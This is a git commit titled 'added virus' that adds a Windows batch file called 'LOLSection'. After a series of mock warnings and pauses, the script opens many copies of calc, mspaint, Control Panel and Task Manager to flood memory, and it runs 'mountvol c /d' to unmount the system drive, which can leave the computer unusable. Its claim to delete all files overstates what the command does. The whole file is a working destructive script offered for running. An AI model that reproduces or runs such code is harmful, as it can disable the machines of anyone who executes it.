aeba07c3efa3938946c72a9e99fd03043acfa865
creproductions102 <118870230+creproductions102@users.noreply.github.com>
2023-12-31 21:09:52 -0600

    added virus

---
+++ Dissection 2-LOLSection.bat
@@ -0,0 +1,233 @@
+@echo off
+title LOLSection (USELESS PC)
+rem before sequence
+echo Welcome to hell!
+echo Executing some programs, and then killing the pc with a simple command simpler than deleting c:
+echo LOLSection deletes ALL of your files. Without a access denied. No trustedinstallers. It actually EJECTS the C: drive. Press ANYTHING or close this window to not fxck your computer.
+pause
+echo SEQUENCE 1: PROGRAMS STARTED
+calc
+mspaint
+control
+taskmgr
+rem close to the last sequence
+echo just press anything
+pause
+echo SEQUENCE 2: RAM SQUEEZED
+calc
+calc
+calc
+mspaint
+mspaint
+mspaint
+control
+control
+control
+taskmgr
+taskmgr
+taskmgr
+rem closeee
+echo ULTIMATE SEQUENCE ; SEQUENCE 3: i guess i gotta buy a new pc cuz the c drive is ejected
+echo I AM NOT RESPONSIBLE FOR ANYTHING THAT HAPPENS TO YOUR PC, YOU EXECUTED THIS, YOUR RAM IS SQUEEZED. RU RLLY SURE?
+echo IF YOU'RE ABSOLUTELY SURE AND RUNNING THIS IN A SAFE ENVIRONMENT OR ON A REAL COMPUTER JUST FOR A VIDEO, PRESS ANYTHING.
+echo I WARNED YOU: CLOSE THIS WINDOW TO NOT DAMAGE THE PC.
+echo THE LAST 2 WERE SEQUENCES JUST TO NOT LET YOU KILL YOUR PC.
+echo SO, IT'S NOT STRAIGHT INTO THE THING. IT JUST LOADS SOME APPS BEFORE ACTUALLY STARTING THE DISSECTION.
+pause
+echo Really?
+pause
+echo YOU AREN'T TROLLING ME?
+pause
+echo ACTUALLY?
+pause
+echo Really?
+pause
+echo Really???? 2nd last warning
+pause
+echo Ok... i understand
+echo You wanna kill your pc.
+echo Fine, 1 more time and you're done.
+pause
+rem IT STARTS HERE MORTAL.
+echo DIE MORTAL
+calc
+calc
+calc
+mspaint
+mspaint
+mspaint
+control
+control
+control
+mountvol c /d
+taskmgr
+taskmgr
+taskmgr
+calc
+calc
+calc
+mspaint
+mspaint
+mspaint
+control
+control
+control
+taskmgr
+taskmgr
+taskmgr
+calc
+calc
+calc
+mspaint
+mspaint
+mspaint
+control
+control
+control
+taskmgr
+taskmgr
+taskmgr
+calc
+calc
+calc
+mspaint
+mspaint
+mspaint
+control
+control
+control
+taskmgr
+taskmgr
+taskmgr
+calc
+calc
+calc
+mspaint
+mspaint
+mspaint
+control
+control
+control
+taskmgr
+taskmgr
+taskmgr
+calc
+calc
+calc
+mspaint
+mspaint
+mspaint
+control
+control
+control
+taskmgr
+taskmgr
+taskmgr
+calc
+calc
+calc
+mspaint
+mspaint
+mspaint
+control
+control
+control
+taskmgr
+taskmgr
+taskmgr
+calc
+calc
+calc
+mspaint
+mspaint
+mspaint
+control
+control
+control
+taskmgr
+taskmgr
+taskmgr
+calc
+calc
+calc
+mspaint
+mspaint
+mspaint
+control
+control
+control
+taskmgr
+taskmgr
+taskmgr
+calc
+calc
+calc
+mspaint
+mspaint
+mspaint
+control
+control
+control
+taskmgr
+taskmgr
+taskmgr
+calc
+calc
+calc
+mspaint
+mspaint
+mspaint
+control
+control
+control
+taskmgr
+taskmgr
+taskmgr
+calc
+calc
+calc
+mspaint
+mspaint
+mspaint
+control
+control
+control
+taskmgr
+taskmgr
+taskmgr
+calc
+calc
+calc
+mspaint
+mspaint
+mspaint
+control
+control
+control
+taskmgr
+taskmgr
+taskmgr
+calc
+calc
+calc
+mspaint
+mspaint
+mspaint
+control
+control
+control
+taskmgr
+taskmgr
+taskmgr
+calc
+calc
+calc
+mspaint
+mspaint
+mspaint
+control
+control
+control
+taskmgr
+taskmgr
+taskmgr
